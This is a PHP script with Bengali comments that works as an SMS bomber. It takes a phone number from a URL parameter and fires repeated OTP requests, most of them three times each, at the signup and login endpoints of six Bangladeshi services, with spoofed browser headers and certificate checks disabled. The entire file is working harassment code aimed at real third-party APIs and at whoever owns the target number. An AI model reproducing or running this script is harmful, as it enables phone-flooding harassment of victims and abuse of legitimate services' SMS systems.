<?php
header('Content-Type: application/json');
set_time_limit(0); 

if(!isset($_GET['phone']) || empty($_GET['phone'])){
    echo json_encode(["status" => "error", "message" => "Phone number missing"]);
    exit;
}

$phone = $_GET['phone'];
$phone_11 = (substr($phone, 0, 2) === "88") ? substr($phone, 2) : $phone;
$phone_88 = "88" . $phone_11;
$phone_plus88 = "+88" . $phone_11;

$responses = [];

// কমন CURL ফাংশন (বাকি ৪টার জন্য)
function send_sms($url, $method = 'GET', $data = null, $headers = [], $timeout = 25) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_TIMEOUT => $timeout,
        CURLOPT_CUSTOMREQUEST => $method,
        CURLOPT_POSTFIELDS => ($data ? json_encode($data) : null),
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_ENCODING => '', 
    ]);
    $res = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);
    
    if ($err) return ["error" => $err];
    return json_decode($res, true) ?: $res;
}

// ১. Shikho - ১ বার
$sh_headers = ['Content-Type: application/json', 'User-Agent: Mozilla/5.0', 'origin: https://shikho.com', 'referer: https://shikho.com/'];
$responses["shikho"] = send_sms('https://api.shikho.com/auth/v2/send/sms', 'POST', ["phone" => $phone_88, "type" => "student", "auth_type" => "signup", "vendor" => "shikho"], $sh_headers);
sleep(2);

// ২. RedX - ৩ বার
$rx_headers = ['Content-Type: application/json', 'origin: https://redx.com.bd'];
for($i=1; $i<=3; $i++){
    $responses["redx_$i"] = send_sms('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp', 'POST', ["phoneNumber" => $phone_11], $rx_headers);
    sleep(3);
}

// ৩. Bikroy - ৩ বার
$bk_headers = ['User-Agent: Mozilla/5.0', 'Accept: application/json'];
for($i=1; $i<=3; $i++){
    $responses["bikroy_$i"] = send_sms("https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11", 'GET', null, $bk_headers);
    sleep(2);
}

// ৪. PBS - ৩ বার
$pbs_headers = ['Content-Type: application/json', 'origin: https://pbs.com.bd', 'x-requested-with: mark.via.gp', 'referer: https://pbs.com.bd/'];
for($i=1; $i<=3; $i++){
    $responses["pbs_$i"] = send_sms('https://apialpha.pbs.com.bd/api/OTP/generateOTP', 'POST', ["userPhone" => $phone_11, "otp" => ""], $pbs_headers);
    sleep(2);
}

// ৫. Iqra Live - ৩ বার (ডাইরেক্ট অরিজিনাল কোড)
for($i=1; $i<=3; $i++){
    $curl = curl_init();
    curl_setopt_array($curl, [
      CURLOPT_URL => "https://apibeta.iqra-live.com/api/v2/sent-otp/".$phone_11,
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 30,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'GET',
      CURLOPT_SSL_VERIFYPEER => false,
      CURLOPT_HTTPHEADER => [
        'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-J400F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7632.120 Mobile Safari/537.36',
        'Accept: application/json, text/plain, */*',
        'Accept-Encoding: gzip, deflate, br, zstd',
        'sec-ch-ua-platform: "Android"',
        'sec-ch-ua: "Not:A-Brand";v="99", "Android WebView";v="145", "Chromium";v="145"',
        'sec-ch-ua-mobile: ?1',
        'Origin: https://iqra-live.com',
        'X-Requested-With: mark.via.gp',
        'Sec-Fetch-Site: same-site',
        'Sec-Fetch-Mode: cors',
        'Sec-Fetch-Dest: empty',
        'Referer: https://iqra-live.com/',
        'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8',
      ],
    ]);
    $res = curl_exec($curl);
    $err = curl_error($curl);
    curl_close($curl);
    $responses["iqra_$i"] = $err ? ["error" => $err] : (json_decode($res, true) ?: $res);
    sleep(2);
}

// ৬. BDTickets - ৩ বার (ডাইরেক্ট অরিজিনাল কোড)
for($i=1; $i<=3; $i++){
    $curl = curl_init();
    curl_setopt_array($curl, [
      CURLOPT_URL => 'https://api.bdtickets.com:20100/v1/auth',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 30,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'POST',
      CURLOPT_POSTFIELDS => '{"createUserCheck":true,"phoneNumber":"'.$phone_plus88.'","applicationChannel":"WEB_APP"}',
      CURLOPT_SSL_VERIFYPEER => false,
      CURLOPT_HTTPHEADER => [
        'Host: api.bdtickets.com:20100',
        'User-Agent: Mozilla/5.0 (Linux; Android 10; SM-J400F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.7632.120 Mobile Safari/537.36',
        'Accept: application/json, text/plain, */*',
        'Accept-Encoding: gzip, deflate, br, zstd',
        'Content-Type: application/json',
        'sec-ch-ua-platform: "Android"',
        'sec-ch-ua: "Not:A-Brand";v="99", "Android WebView";v="145", "Chromium";v="145"',
        'sec-ch-ua-mobile: ?1',
        'origin: https://bdtickets.com',
        'x-requested-with: mark.via.gp',
        'sec-fetch-site: same-site',
        'sec-fetch-mode: cors',
        'sec-fetch-dest: empty',
        'referer: https://bdtickets.com/',
        'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
        'priority: u=1, i',
      ],
    ]);
    $res = curl_exec($curl);
    $err = curl_error($curl);
    curl_close($curl);
    $responses["bdtickets_$i"] = $err ? ["error" => $err] : (json_decode($res, true) ?: $res);
    sleep(2);
}

echo json_encode($responses, JSON_PRETTY_PRINT);
?>
